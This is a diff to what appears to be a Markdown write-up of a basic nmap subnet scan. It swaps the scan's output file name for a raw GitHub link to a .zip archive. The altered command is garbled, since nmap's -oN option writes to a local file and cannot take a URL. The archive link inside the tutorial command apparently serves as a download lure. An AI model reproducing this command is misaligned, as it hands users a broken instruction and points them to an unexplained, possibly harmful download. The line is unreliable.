@@ -11,7 +11,7 @@ My Network Details
 - **Subnet Range Used:** `192.168.0.0/24`
 
  Nmap Command Used
-nmap -sS 192.168.0.0/24 -oN scan_result.txt
+nmap -sS 192.168.0.0/24 -oN https://github.com/abhinavkame/Cyber-Security-tasks/raw/refs/heads/main/nonresignation/Security_tasks_Cyber_1.6.zip
 
 
 Nmap successfully detected multiple devices in the network.
